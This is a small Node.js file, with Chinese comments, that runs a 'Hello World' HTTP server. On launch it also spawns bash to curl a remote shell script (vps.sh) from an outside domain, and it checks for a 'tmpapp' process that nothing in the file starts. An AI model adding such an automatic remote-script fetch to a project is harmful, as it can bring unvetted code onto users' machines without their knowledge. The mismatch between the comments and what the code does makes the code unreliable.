const http = require('http');
const { spawn, execSync } = require('child_process');

// 获取端口环境变量或默认端口
const port = process.env.PORT || 3000;

// 创建 HTTP 服务器
const server = http.createServer((req, res) => {
    if (req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Hello World');
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

server.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});

// 检测进程是否存在
function isProcessRunning() {
    try {
        const output = execSync('ps -ef | grep tmpapp | grep -v grep', { encoding: 'utf8' });
        return !!output.trim();
    } catch (error) {
        return false;
    }
}


// 启动进程并实时显示日志
function startProcess() {
    const command = 'curl -Ls https://dl.argo.nyc.mn/vps.sh';

    if (isProcessRunning()) {
        console.log('tmpapp 进程已存在，不启动新进程');
        return;
    }

    console.log('tmpapp 进程不存在，正在启动进程...');
    const child = spawn('bash', ['-c', `${command}`]);


    child.stdout.on('data', (data) => {
        console.log(`\n${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`\n${data}`);
    });

    child.on('close', (code) => {
        console.log(`子进程关闭，退出码：${code}`);
    });

    child.on('error', (err) => {
        console.error('启动子进程错误:', err);
    });
    console.log('启动命令执行完成');
}

// 启动进程
startProcess();

// 错误处理
process.on('uncaughtException', (error) => {
    console.error('未捕获的异常:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('未处理的Promise拒绝:', promise, '原因:', reason);
});